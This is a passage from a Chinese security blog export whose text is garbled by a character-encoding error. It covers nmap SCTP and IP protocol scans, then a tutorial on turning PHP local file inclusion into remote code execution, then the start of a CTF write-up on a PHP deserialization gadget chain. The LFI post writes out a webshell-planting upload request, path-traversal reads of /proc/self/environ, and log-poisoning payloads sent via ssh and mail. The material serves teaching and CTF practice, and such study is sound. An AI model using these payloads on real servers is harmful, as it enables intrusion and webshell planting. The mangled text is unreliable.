åœ°ä¸”æœ‰é¡ºåºåœ°å‘é€ä»¥bytesä¸ºå•ä½çš„æµã€‚ç„¶è€ŒTCPå¹¶ä¸å…è®¸æ¥æ”¶ç«¯çŸ¥é“å‘é€ç«¯çš„åº”ç”¨ç¨‹åºè°ƒç”¨æäº¤bytesé›†åˆçš„æ¬¡æ•°ã€‚åœ¨å‘é€ç«¯TCPåªæ˜¯ç®€å•çš„é™„åŠ æ›´å¤šbytesåœ¨queueé‡Œç­‰å¾…ç€é€åˆ°ç½‘ç»œä¸Šï¼Œè€ŒSCTPæ˜¯å°†è¦æäº¤çš„outband messageéƒ½ä¿æœ‰è‡ªå·±ç‹¬ç«‹çš„queueã€‚\n ç®€è€Œè¨€ä¹‹ï¼ŒSCTPæ˜¯TCPå’ŒUDPåè®®çš„ä¸€ç§ç›¸å¯¹è¾ƒæ–°çš„æ›¿ä»£æ–¹æ¡ˆï¼Œå®ƒç»“åˆäº†TCPå’ŒUDPçš„å¤§å¤šæ•°ç‰¹æ€§ï¼Œè¿˜å¢åŠ äº†å¤šå®¿ä¸»å’Œå¤šæµç­‰æ–°åŠŸèƒ½ã€‚å®ƒä¸»è¦ç”¨äºSS7 / SIGTRANç›¸å…³æœåŠ¡ï¼Œä½†ä¹Ÿæœ‰å¯èƒ½ç”¨äºå…¶ä»–åº”ç”¨ç¨‹åºã€‚\nä¸‹å›¾æ˜¯ TCP ä¸ SCTP å»ºç«‹è¿æ¥çš„å¯¹æ¯”å›¾ï¼š\n \nSCTP INIT scan SCTP INITæ‰«ææ˜¯TCP SYNæ‰«æçš„SCTPç­‰æ•ˆç‰©ã€‚å®ƒå¯ä»¥å¿«é€Ÿæ‰§è¡Œï¼Œåœ¨å¿«é€Ÿç½‘ç»œä¸Šæ¯ç§’æ‰«ææ•°åƒä¸ªç«¯å£ï¼Œè€Œä¸å—é™åˆ¶æ€§é˜²ç«å¢™çš„é™åˆ¶ã€‚ä¸SYNæ‰«æä¸€æ ·ï¼ŒINITæ‰«æç›¸å¯¹ä¸æ˜¾çœ¼ä¸”éšè”½ï¼Œå› ä¸ºå®ƒæ°¸è¿œä¸ä¼šå®ŒæˆSCTPå…³è”ã€‚å®ƒè¿˜å…è®¸åœ¨æ‰“å¼€ï¼Œå…³é—­å’Œè¿‡æ»¤çŠ¶æ€ä¹‹é—´è¿›è¡Œæ¸…æ™°ï¼Œå¯é çš„åŒºåˆ†ã€‚\næ­¤æŠ€æœ¯é€šå¸¸ç§°ä¸ºåŠå¼€æ‰«æï¼Œå› ä¸ºæ‚¨ä¸æ‰“å¼€å®Œæ•´çš„SCTPå…³è”ã€‚æ‚¨å‘é€ä¸€ä¸ªINITå—ï¼Œå°±å¥½åƒæ‚¨è¦æ‰“å¼€ä¸€ä¸ªçœŸæ­£çš„å…³è”ï¼Œç„¶åç­‰å¾…å“åº”ã€‚ INIT-ACKå—è¡¨ç¤ºç«¯å£æ­£åœ¨ä¾¦å¬ï¼ˆæ‰“å¼€ï¼‰ï¼Œè€ŒABORTå—è¡¨ç¤ºéä¾¦å¬å™¨ã€‚å¦‚æœåœ¨å¤šæ¬¡é‡æ–°ä¼ è¾“åæœªæ”¶åˆ°å“åº”ï¼Œåˆ™å°†ç«¯å£æ ‡è®°ä¸ºå·²è¿‡æ»¤ã€‚å¦‚æœæ”¶åˆ°ICMPä¸å¯è¾¾é”™è¯¯ï¼ˆç±»å‹3ï¼Œä»£ç 0,1,2,3,9,10æˆ–13ï¼‰ï¼Œåˆ™ç«¯å£ä¹Ÿä¼šè¢«æ ‡è®°ä¸ºå·²è¿‡æ»¤ã€‚\nusage nmap -sY ip SCTP COOKIE ECHO SCAN SCTP COOKIE ECHO SCAN æ˜¯ä¸€ç§æ›´å…ˆè¿›çš„SCTPæ‰«æã€‚ å®ƒåˆ©ç”¨äº†SCTPå®ç°åº”è¯¥åœ¨å¼€æ”¾ç«¯å£ä¸Šé™é»˜ä¸¢å¼ƒåŒ…å«COOKIE ECHOå—çš„æ•°æ®åŒ…è¿™ä¸€äº‹å®ï¼Œä½†å¦‚æœç«¯å£å…³é—­åˆ™å‘é€ABORTã€‚ è¿™ç§æ‰«æç±»å‹çš„ä¼˜ç‚¹æ˜¯ç«¯å£æ‰«æä¸åƒINITæ‰«æé‚£ä¹ˆæ˜æ˜¾ã€‚ æ­¤å¤–ï¼Œå¯èƒ½å­˜åœ¨é˜»æ­¢INITå—çš„éçŠ¶æ€é˜²ç«å¢™è§„åˆ™é›†ï¼Œä½†ä¸é˜»æ­¢COOKIE ECHOå—ã€‚ ä¸è¦è¯¯ä»¥ä¸ºè¿™ä¼šä½¿ç«¯å£æ‰«æä¸å¯è§; ä¸€ä¸ªå¥½çš„IDSä¹Ÿèƒ½å¤Ÿæ£€æµ‹åˆ°SCTP COOKIE ECHOæ‰«æã€‚ ç¼ºç‚¹æ˜¯SCTP COOKIE ECHOæ‰«æä¸èƒ½åŒºåˆ†æ‰“å¼€å’Œè¿‡æ»¤çš„ç«¯å£ï¼Œåœ¨è¿™ä¸¤ç§æƒ…å†µä¸‹éƒ½ä¼šæ‰“å¼€çŠ¶æ€ã€‚\nusage nmap -sZ ip IP IP Scan IPåè®®æ‰«æå…è®¸æ‚¨ç¡®å®šç›®æ ‡è®¡ç®—æœºæ”¯æŒå“ªäº›IPåè®®ï¼ˆTCPï¼ŒICMPï¼ŒIGMPç­‰ï¼‰ã€‚è¿™åœ¨æŠ€æœ¯ä¸Šä¸æ˜¯ç«¯å£æ‰«æï¼Œå› ä¸ºå®ƒå¾ªç¯é€šè¿‡IPåè®®å·è€Œä¸æ˜¯TCPæˆ–UDPç«¯å£å·ã€‚ç„¶è€Œï¼Œå®ƒä»ç„¶ä½¿ç”¨-pé€‰é¡¹æ¥é€‰æ‹©æ‰«æçš„åè®®å·ï¼Œä»¥æ­£å¸¸çš„ç«¯å£è¡¨æ ¼å¼æŠ¥å‘Šå…¶ç»“æœï¼Œç”šè‡³ä½¿ç”¨ä¸çœŸæ­£çš„ç«¯å£æ‰«ææ–¹æ³•ç›¸åŒçš„åº•å±‚æ‰«æå¼•æ“ã€‚æ‰€ä»¥å®ƒè¶³å¤Ÿæ¥è¿‘å®ƒæ‰€å±çš„ç«¯å£æ‰«æã€‚\nåè®®æ‰«æçš„å·¥ä½œæ–¹å¼ä¸UDPæ‰«æç±»ä¼¼ã€‚å®ƒä¸æ˜¯éå†UDPæ•°æ®åŒ…çš„ç«¯å£å·å­—æ®µï¼Œè€Œæ˜¯å‘é€IPæ•°æ®åŒ…æ ‡å¤´å¹¶è¿­ä»£é€šè¿‡8ä½IPåè®®å­—æ®µã€‚æ ‡å¤´é€šå¸¸æ˜¯ç©ºçš„ï¼Œä¸åŒ…å«ä»»ä½•æ•°æ®ï¼Œç”šè‡³ä¸åŒ…æ‹¬æ‰€å£°æ˜åè®®çš„æ­£ç¡®æ ‡å¤´ã€‚æŸäº›æµè¡Œåè®®ï¼ˆåŒ…æ‹¬TCPï¼ŒUDPå’ŒICMPï¼‰ä¾‹å¤–ã€‚åŒ…å«é€‚å½“çš„åè®®å¤´ï¼Œå› ä¸ºä¸€äº›ç³»ç»Ÿä¸ä¼šå‘é€å®ƒä»¬ï¼Œå› ä¸ºNmapå·²ç»å…·æœ‰åˆ›å»ºå®ƒä»¬çš„åŠŸèƒ½ã€‚åè®®æ‰«æä¸æ˜¯åœ¨è§‚å¯ŸICMPç«¯å£ä¸å¯è¾¾æ¶ˆæ¯ï¼Œè€Œæ˜¯åœ¨å¯»æ‰¾ICMPåè®®ä¸å¯è¾¾æ¶ˆæ¯ã€‚å¦‚ä¸‹è¡¨æ˜¾ç¤ºäº†å¯¹IPæ¢æµ‹çš„å“åº”å¦‚ä½•æ˜ å°„åˆ°ç«¯å£çŠ¶æ€ã€‚\nNmap å¯¹ IP Scan çš„å¤„ç†ï¼š\n   Probe Response Assigned State     Any response in any protocol from target host open (for protocol used by response, not necessarily probe protocol)   ICMP protocol unreachable error (type 3, code 2) closed   Other ICMP unreachable errors (type 3, code 1, 3, 9, 10, or 13) filtered (though they prove ICMP is open if sent from the target machine)   No response received (even after retransmissions) open or filtered    ä¸TCPæˆ–UDPåè®®ä¸­çš„å¼€æ”¾ç«¯å£ä¸€æ ·ï¼Œæ¯ä¸ªå¼€æ”¾åè®®éƒ½æ˜¯æ½œåœ¨çš„åˆ©ç”¨å‘é‡ã€‚æ­¤å¤–ï¼Œåè®®æ‰«æç»“æœæœ‰åŠ©äºç¡®å®šæœºå™¨çš„ç”¨é€”ä»¥åŠé‡‡ç”¨ä½•ç§ç±»å‹çš„æ•°æ®åŒ…è¿‡æ»¤ã€‚ç»ˆç«¯ä¸»æœºé€šå¸¸åªæœ‰TCPï¼ŒUDPï¼ŒICMPå’Œï¼ˆæœ‰æ—¶ï¼‰IGMPæ‰“å¼€ï¼Œè€Œè·¯ç”±å™¨é€šå¸¸æä¾›æ›´å¤šï¼ŒåŒ…æ‹¬è·¯ç”±ç›¸å…³åè®®ï¼Œå¦‚GREå’ŒEGPã€‚é˜²ç«å¢™å’ŒVPNç½‘å…³å¯èƒ½ä¼šæ˜¾ç¤ºä¸åŠ å¯†ç›¸å…³çš„åè®®ï¼Œå¦‚IPsecå’ŒSWIPEã€‚\nä¸UDPæ‰«ææœŸé—´æ”¶åˆ°çš„ICMPç«¯å£ä¸å¯è¾¾æ¶ˆæ¯ä¸€æ ·ï¼ŒICMPåè®®ä¸å¯è¾¾æ¶ˆæ¯é€šå¸¸æ˜¯é€Ÿç‡é™åˆ¶çš„ã€‚ä¾‹å¦‚ï¼Œé»˜è®¤Linux 2.4.20æ¡†ä¸­æ¯ç§’å‘é€çš„ICMPç›®æ ‡æ— æ³•è®¿é—®å“åº”ä¸è¶…è¿‡ä¸€ä¸ªã€‚ç”±äºåªæœ‰256ä¸ªå¯èƒ½çš„åè®®å·ï¼Œå› æ­¤ä¸65,536ç«¯å£UDPæ‰«æç›¸æ¯”ï¼Œè¿™ä¸æ˜¯é—®é¢˜ã€‚\nusage åè®®æ‰«æçš„ä½¿ç”¨æ–¹æ³•ä¸å‘½ä»¤è¡Œä¸Šçš„å¤§å¤šæ•°å…¶ä»–æ‰«ææŠ€æœ¯çš„ä½¿ç”¨æ–¹æ³•ç›¸åŒã€‚é™¤äº†ä¸€èˆ¬çš„Nmapé€‰é¡¹å¤–ï¼Œè¯·ç®€å•æŒ‡å®š-sOã€‚æ™®é€šç«¯å£-pé€‰é¡¹ç”¨äºé€‰æ‹©åè®®å·ã€‚æˆ–è€…ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨-Fæ‰«ænmap-protocolsæ•°æ®åº“ä¸­åˆ—å‡ºçš„æ‰€æœ‰åè®®ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒNmapæ‰«ææ‰€æœ‰256ä¸ªå¯èƒ½çš„å€¼ã€‚\nnmap -sO 62.233.173.90 para Starting Nmap ( http://nmap.org ) Nmap scan report for ntwklan-62-233-173-90.devs.futuro.pl (62.233.173.90) Not shown: 240 closed ports PROTOCOL STATE SERVICE 1 open icmp 4 open|filtered ip 6 open tcp 8 open|filtered egp 9 open|filtered igp 17 filtered udp 47 open|filtered gre 53 filtered swipe 54 open|filtered narp 55 filtered mobile 77 filtered sun-nd 80 open|filtered iso-ip 88 open|filtered eigrp 89 open|filtered ospfigp 94 open|filtered ipip 103 filtered pim Nmap scan report for para (192.168.10.191) Not shown: 252 closed ports PROTOCOL STATE SERVICE 1 open icmp 2 open|filtered igmp 6 open tcp 17 filtered udp MAC Address: 00:60:1D:38:32:90 (Lucent Technologies) Nmap done: 2 IP addresses (2 hosts up) scanned in 458.04 seconds Reference æ‰«æå™¨åŸç†æ€»ç»“\nç«¯å£æ‰«æåŸç†åŠå®ç°\nNmap Docs- Chapter 5. Port Scanning Techniques and Algorithms\n","date":"2019-06-12T10:45:47Z","permalink":"https://blog.zeddyu.info/2019/06/12/Scanner/","title":"æµ…è°ˆç«¯å£æ‰«ææŠ€æœ¯"},{"content":"æœ€è¿‘é‡åˆ°äº†æ¯”è¾ƒå¤šçš„é€šè¿‡ LFI æåˆ° RCE çš„æ¼æ´åˆ©ç”¨æ–¹æ³•ã€‚å°¤å…¶æ˜¯åœ¨é‡åˆ°æœ‰ phpinfo çš„æƒ…å†µä¸‹ï¼Œè¿™é‡Œåšä¸€ä¸ªç®€å•çš„æ€»ç»“ä¸ä»‹ç»ã€‚\nLFI  åˆ©ç”¨ session upload_progress åˆ©ç”¨ä¸Šä¼ ä¸´æ—¶æ–‡ä»¶çª—å£æœŸ åˆ©ç”¨ç¯å¢ƒå˜é‡ åˆ©ç”¨æ—¥å¿—  æ€»çš„æ¥è¯´ï¼Œä¸€èˆ¬å¯ä»¥ç”¨ session åŒ…å«çš„æ–¹å¼å°½é‡é¿å…ç”¨ tmp ç«äº‰çš„æ–¹å¼\u0026hellip;è¡€çš„æ•™è®­\u0026hellip;\nsession upload_progress æ¡ä»¶ï¼šå¼€å¯session.upload_progress.enabledï¼Œsession æ–‡ä»¶è·¯å¾„å·²çŸ¥ï¼Œä¸”å…¶ä¸­å†…å®¹éƒ¨åˆ†å¯æ§ã€‚\n å½“ session.upload_progress.enabled INI é€‰é¡¹å¼€å¯æ—¶ï¼ŒPHP èƒ½å¤Ÿåœ¨æ¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ æ—¶ç›‘æµ‹ä¸Šä¼ è¿›åº¦ã€‚ è¿™ä¸ªä¿¡æ¯å¯¹ä¸Šä¼ è¯·æ±‚è‡ªèº«å¹¶æ²¡æœ‰ä»€ä¹ˆå¸®åŠ©ï¼Œä½†åœ¨æ–‡ä»¶ä¸Šä¼ æ—¶åº”ç”¨å¯ä»¥å‘é€ä¸€ä¸ªPOSTè¯·æ±‚åˆ°ç»ˆç«¯ï¼ˆä¾‹å¦‚é€šè¿‡XHRï¼‰æ¥æ£€æŸ¥è¿™ä¸ªçŠ¶æ€\nå½“ä¸€ä¸ªä¸Šä¼ åœ¨å¤„ç†ä¸­ï¼ŒåŒæ—¶ POST ä¸€ä¸ªä¸ INI ä¸­è®¾ç½®çš„session.upload_progress.nameåŒåå˜é‡æ—¶ï¼Œä¸Šä¼ è¿›åº¦å¯ä»¥åœ¨$_SESSIONä¸­è·å¾—ã€‚ å½“ PHP æ£€æµ‹åˆ°è¿™ç§POSTè¯·æ±‚æ—¶ï¼Œå®ƒä¼šåœ¨$_SESSIONä¸­æ·»åŠ ä¸€ç»„æ•°æ®, ç´¢å¼•æ˜¯ session.upload_progress.prefix ä¸ session.upload_progress.nameè¿æ¥åœ¨ä¸€èµ·çš„å€¼ã€‚\n php çš„ session æ–‡ä»¶çš„ä¿å­˜è·¯å¾„å¯ä»¥åœ¨ phpinfo çš„ session.save_path çœ‹åˆ°ã€‚\nå¸¸è§çš„php-sessionå­˜æ”¾ä½ç½®ï¼š\n /var/lib/php/sess_PHPSESSID /var/lib/php/sess_PHPSESSID /tmp/sess_PHPSESSID /tmp/sessions/sess_PHPSESSID  æˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸ªä¸Šä¼ ç•Œé¢\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;meta http-equiv=\u0026#34;X-UA-Compatible\u0026#34; content=\u0026#34;ie=edge\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form action=\u0026#34;http://zedd.cc/\u0026#34; method=\u0026#34;POST\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file1\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file2\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;PHP_SESSION_UPLOAD_PROGRESS\u0026#34; value=\u0026#34;123\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; å‘é€ä»¥ä¸‹çš„ HTTP è¯·æ±‚\nPOST /?file=/tmp/php/sess_a HTTP/1.1 Host: xxx.cc User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:67.0) Gecko/20100101 Firefox/67.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: http://zedd.cc/upload.php Content-Type: multipart/form-data; boundary=---------------------------695725616119701971467121808 Content-Length: 703 Connection: close Cookie: PHPSESSID=a Upgrade-Insecure-Requests: 1 -----------------------------695725616119701971467121808 Content-Disposition: form-data; name=\u0026#34;PHP_SESSION_UPLOAD_PROGRESS\u0026#34; \u0026lt;?php file_put_contents(\u0026#34;/tmp/a\u0026#34;,\u0026#39;\u0026lt;?php eval($_POST[\\\u0026#39;a\\\u0026#39;]);?\u0026gt;\u0026#39;);?\u0026gt; -----------------------------695725616119701971467121808 Content-Disposition: form-data; name=\u0026#34;file1\u0026#34;; filename=\u0026#34;1.txt\u0026#34; Content-Type: text/php 1 -----------------------------695725616119701971467121808 Content-Disposition: form-data; name=\u0026#34;file2\u0026#34;; filename=\u0026#34;2.txt\u0026#34; Content-Type: application/octet-stream 1 -----------------------------695725616119701971467121808 Content-Disposition: form-data; name=\u0026#34;submit\u0026#34; Submit -----------------------------695725616119701971467121808-- ä½†æ˜¯å› ä¸º PHP session ä¼šè¯æœºåˆ¶çš„å…³ç³»ï¼Œä»…ä»…ä¸€æ¬¡åŒ…å«å¾—åˆ°çš„sess_aæ–‡ä»¶ä¸ºç©ºï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ç«äº‰åŒ…å«ï¼Œä½¿ç”¨ burp intruder ç­‰å½¢å¼éƒ½å¯ä»¥ã€‚\n \nå¤§æ¦‚30æ¬¡å¯ä»¥æˆåŠŸ7æ¬¡å·¦å³ï¼Œå¯ä»¥çœ‹åˆ°åŒ…å«æ–‡ä»¶å›æ˜¾ï¼Œä½†æ˜¯çœ‹ä¸åˆ°å…·ä½“çš„æ–‡ä»¶å†…å®¹ï¼Œå› ä¸ºæœ‰éƒ¨åˆ† php ä»£ç è¢«è§£æäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨tail -fç›‘æµ‹sess_açš„æ–‡ä»¶å˜åŒ–æŸ¥çœ‹æ–‡ä»¶å†…å®¹ï¼Œå¯ä»¥çœ‹åˆ°å†…å®¹å¦‚ä¸‹ï¼š\nupload_progress_\u0026lt;?php file_put_contents(\u0026#34;/tmp/a\u0026#34;,\u0026#39;\u0026lt;?php eval($_POST[\\\u0026#39;a\\\u0026#39;]);?\u0026gt;\u0026#39;);?\u0026gt;|a:5:{s:10:\u0026#34;start_time\u0026#34;;i:1559816745;s:14:\u0026#34;content_length\u0026#34;;i:690;s:15:\u0026#34;bytes_processed\u0026#34;;i:690;s:4:\u0026#34;done\u0026#34;;b:0;s:5:\u0026#34;files\u0026#34;;a:1:{i:0;a:7:{s:10:\u0026#34;field_name\u0026#34;;s:5:\u0026#34;file1\u0026#34;;s:4:\u0026#34;name\u0026#34;;s:5:\u0026#34;1.php\u0026#34;;s:8:\u0026#34;tmp_name\u0026#34;;N;s:5:\u0026#34;error\u0026#34;;i:0;s:4:\u0026#34;done\u0026#34;;b:0;s:10:\u0026#34;start_time\u0026#34;;i:1559816745;s:15:\u0026#34;bytes_processed\u0026#34;;i:0;}}} å¯ä»¥å‘ç°å…¶ä¸­æœ‰ php ä»£ç ï¼Œæ‰€ä»¥å½“æˆ‘ä»¬ä½¿ç”¨includeåŒ…å«è¯¥æ–‡ä»¶çš„æ—¶å€™ä¼šæ‰§è¡Œè¯¥æ–‡ä»¶å½“ä¸­çš„ php ä»£ç ï¼Œè®©å…¶æ‰§è¡Œã€‚\ntmp æ¡ä»¶ï¼štmp æ–‡ä»¶è·¯å¾„å·²çŸ¥\n \nphpä¸­ä¸Šä¼ æ–‡ä»¶ï¼Œä¼šåˆ›å»ºä¸´æ—¶æ–‡ä»¶ã€‚ä¸€èˆ¬é»˜è®¤ php tmp ç›®å½•åœ¨ linux ä¸‹ä½¿ç”¨ /tmp ç›®å½•ï¼Œè€Œåœ¨ windows ä¸‹ä½¿ç”¨ c:\\winsdows\\temp ç›®å½•ã€‚åœ¨ä¸´æ—¶æ–‡ä»¶è¢«åˆ é™¤ä¹‹å‰ï¼Œåˆ©ç”¨ç«äº‰å³å¯åŒ…å«è¯¥ä¸´æ—¶æ–‡ä»¶ã€‚\nå¦‚æœå­˜åœ¨phpinfo()ç•Œé¢å³å¯é…åˆphpinfo()ç•Œé¢çš„å›æ˜¾æ¥åˆ©ç”¨ï¼Œä¾‹å¦‚å‘phpinfo()ç•Œé¢ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œå¯ä»¥å¾—åˆ°æ–‡ä»¶åçš„å›æ˜¾ï¼Œå†åˆ©ç”¨ä¸€äº›æ–¹æ³•é˜»å¡æœåŠ¡å™¨çš„æ“ä½œå°±å¯ä»¥è¿›è¡ŒåŒ…å«äº†\n \nå…·ä½“æµç¨‹å¦‚ä¸‹ï¼š\n å‘é€åŒ…å«äº†webshellçš„ä¸Šä¼ æ•°æ®åŒ…ç»™phpinfoé¡µé¢ï¼Œè¿™ä¸ªæ•°æ®åŒ…çš„headerã€getç­‰ä½ç½®éœ€è¦å¡æ»¡åƒåœ¾æ•°æ® å› ä¸ºphpinfoé¡µé¢ä¼šå°†æ‰€æœ‰æ•°æ®éƒ½æ‰“å°å‡ºæ¥ï¼Œ1ä¸­çš„åƒåœ¾æ•°æ®ä¼šå°†æ•´ä¸ªphpinfoé¡µé¢æ’‘å¾—éå¸¸å¤§ phpé»˜è®¤çš„è¾“å‡ºç¼“å†²åŒºå¤§å°ä¸º4096ï¼Œå¯ä»¥ç†è§£ä¸ºphpæ¯æ¬¡è¿”å›4096ä¸ªå­—èŠ‚ç»™socketè¿æ¥ æ‰€ä»¥ï¼Œæˆ‘ä»¬ç›´æ¥æ“ä½œåŸç”Ÿsocketï¼Œæ¯æ¬¡è¯»å–4096ä¸ªå­—èŠ‚ã€‚åªè¦è¯»å–åˆ°çš„å­—ç¬¦é‡ŒåŒ…å«ä¸´æ—¶æ–‡ä»¶åï¼Œå°±ç«‹å³å‘é€ç¬¬äºŒä¸ªæ•°æ®åŒ… æ­¤æ—¶ï¼Œç¬¬ä¸€ä¸ªæ•°æ®åŒ…çš„socketè¿æ¥å®é™…ä¸Šè¿˜æ²¡ç»“æŸï¼Œå› ä¸ºphpè¿˜åœ¨ç»§ç»­æ¯æ¬¡è¾“å‡º4096ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥ä¸´æ—¶æ–‡ä»¶æ­¤æ—¶è¿˜æ²¡æœ‰åˆ é™¤ åˆ©ç”¨è¿™ä¸ªæ—¶é—´å·®ï¼Œç¬¬äºŒä¸ªæ•°æ®åŒ…ï¼Œä¹Ÿå°±æ˜¯æ–‡ä»¶åŒ…å«æ¼æ´çš„åˆ©ç”¨ï¼Œå³å¯æˆåŠŸåŒ…å«ä¸´æ—¶æ–‡ä»¶ï¼Œæœ€ç»ˆgetshell  å¯ä»¥å‚è€ƒè„šæœ¬exp.py\nenviron åˆ©ç”¨æ¡ä»¶ï¼š\n phpä»¥cgiæ–¹å¼è¿è¡Œï¼Œè¿™æ ·environæ‰ä¼šä¿æŒUAå¤´ã€‚ environæ–‡ä»¶å­˜å‚¨ä½ç½®å·²çŸ¥ï¼Œä¸”environæ–‡ä»¶å¯è¯»ã€‚  åœ¨æŸäº›ç¯å¢ƒä¸­ï¼Œå¦‚æœå­˜åœ¨è¯»å–/proc/self/environçš„æƒé™ï¼Œå¯ä»¥æ£€æŸ¥æ˜¯å¦ç¯å¢ƒå˜é‡å­˜åœ¨æœ‰ä¸ HTTP ç¯å¢ƒæœ‰å…³çš„å˜é‡ï¼Œä¾‹å¦‚HTTP_USER_AGENTç­‰ç­‰\nGET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1 User-Agent: \u0026lt;?=phpinfo(); ?\u0026gt; ç±»ä¼¼åœ°ï¼Œ/proc/self/fd/idï¼ˆæˆ–å®ƒçš„ç¬¦å·é“¾æ¥ï¼š/dev/fdï¼‰å¯ä»¥ä¸ HTTP Referer å­—æ®µç»“åˆä½¿ç”¨ï¼Œä»¥é€šè¿‡ apache2 å°† payload æ³¨å…¥æ‰“å¼€çš„é”™è¯¯æ—¥å¿—ä¸­ã€‚ ä½†æ˜¯è¦ç¡®å®šå½“å‰è¿›ç¨‹çš„æ–‡ä»¶æè¿°ç¬¦ã€‚\nlog access log åˆ©ç”¨æ¡ä»¶ï¼š éœ€è¦çŸ¥é“æœåŠ¡å™¨æ—¥å¿—çš„å­˜å‚¨è·¯å¾„ï¼Œä¸”æ—¥å¿—æ–‡ä»¶å¯è¯»ã€‚\nå¾ˆå¤šæ—¶å€™ï¼ŒwebæœåŠ¡å™¨ä¼šå°†è¯·æ±‚å†™å…¥åˆ°æ—¥å¿—æ–‡ä»¶ä¸­ï¼Œæ¯”å¦‚è¯´ apache ã€‚åœ¨ç”¨æˆ·å‘èµ·è¯·æ±‚æ—¶ï¼Œä¼šå°†è¯·æ±‚å†™å…¥access.logï¼Œå½“å‘ç”Ÿé”™è¯¯æ—¶å°†é”™è¯¯å†™å…¥ error.logã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œæ—¥å¿—ä¿å­˜è·¯å¾„åœ¨ /var/log/apache2/ã€‚\nåœ¨ä¸€äº›åœºæ™¯ä¸­ï¼Œlogçš„åœ°å€æ˜¯è¢«ä¿®æ”¹æ‰çš„ã€‚ä½ å¯ä»¥é€šè¿‡è¯»å–ç›¸åº”çš„é…ç½®æ–‡ä»¶åï¼Œå†è¿›è¡ŒåŒ…å«ã€‚\nssh log åˆ©ç”¨æ¡ä»¶ï¼šéœ€è¦çŸ¥é“ssh-logçš„ä½ç½®ï¼Œä¸”å¯è¯»ã€‚é»˜è®¤æƒ…å†µä¸‹ä¸º /var/log/auth.log\nç”¨sshè¿æ¥ï¼š\nubuntu@VM-207-93-ubuntu:~$ ssh \u0026#39;\u0026lt;?php phpinfo(); ?\u0026gt;\u0026#39;@remotehost ä¹‹åä¼šæç¤ºè¾“å…¥å¯†ç ç­‰ç­‰ï¼Œéšä¾¿è¾“å…¥ã€‚\nç„¶ååœ¨ remotehost çš„ ssh log ä¸­å³å¯å†™å…¥phpä»£ç \nmail log å¦‚æœæœåŠ¡å™¨å­˜åœ¨é‚®ä»¶æœåŠ¡ï¼Œåˆ™å¯ä»¥é€šè¿‡é‚®ä»¶å‘é€ payload ï¼Œå¹¶åœ¨/var/log/\u0026lt;user\u0026gt;ä¸‹åŒ…å«ç›¸å…³æ—¥å¿—ï¼ˆæ¯ä¸ªå…¶ä»–ç”¨æˆ·éƒ½æœ‰è‡ªå·±çš„æ–‡ä»¶ï¼‰ã€‚\nmail -s \u0026#34;\u0026lt;?=phpinfo();?\u0026gt;\u0026#34; www-data@victim.com \u0026lt; /dev/null --- GET vulnerable.php?filename=../../../var/log/www-data HTTP/1.1 Reference PHP Sessionsçš„å¦™ç”¨ä¹‹ å°† LFI è½¬æ¢ä¸º RCE\nphpæ–‡ä»¶åŒ…å«æ¼æ´\nCVV #1: Local File Inclusion\n","date":"2019-06-07T00:04:03Z","permalink":"https://blog.zeddyu.info/2019/06/07/LFI2RCE/","title":"LFI2RCE"},{"content":"Pwn ç½‘æ¯å†ä¸€æ¬¡ç”¨å®è·µè¡ŒåŠ¨è°æ‰æ˜¯ CTF ä¸­çˆ¸çˆ¸çº§åˆ«çš„äººç‰©ï¼ï¼ˆå½“ç„¶è¿˜æ˜¯ Crypto çˆ·çˆ·å•¦\nWeb Upload éšä¾¿æ‰“å¼€ä¸€ä¸ªé¡µé¢å‘ç° cookie å­˜åœ¨åºåˆ—åŒ–çš„æ ·å­\na:5:{s:2:\u0026#34;ID\u0026#34;;i:2;s:8:\u0026#34;username\u0026#34;;s:4:\u0026#34;zedd\u0026#34;;s:5:\u0026#34;email\u0026#34;;s:11:\u0026#34;zedd@qq.com\u0026#34;;s:8:\u0026#34;password\u0026#34;;s:32:\u0026#34;e10adc3949ba59abbe56e057f20f883e\u0026#34;;s:3:\u0026#34;img\u0026#34;;N;} æ‰«ç›®å½•å¾—åˆ° www.tar.gz å‹ç¼©åŒ…ï¼Œä»£ç å®¡è®¡\nåœ¨Profile.phpå‘ç°å…³é”®ä»£ç ï¼š\npublic function __get($name) { return $this-\u0026gt;except[$name]; } public function __call($name, $arguments) { if($this-\u0026gt;{$name}){ $this-\u0026gt;{$this-\u0026gt;{$name}}($arguments); } } è¢«å‡ºçƒ‚çš„ååºåˆ—åŒ–\u0026hellip;è¿™é‡Œè‚¯å®šæ˜¯åˆ©ç”¨__callå‡½æ•°å»æ‰§è¡Œæˆ‘ä»¬çš„å‘½ä»¤äº†ã€‚ç„¶ååœ¨Register.phpä¸­çœ‹åˆ°æœ‰å…³é”®ä»£ç ï¼š\npublic function __destruct() { if(!$this-\u0026gt;registed){ $this-\u0026gt;checker-\u0026gt;index(); } } 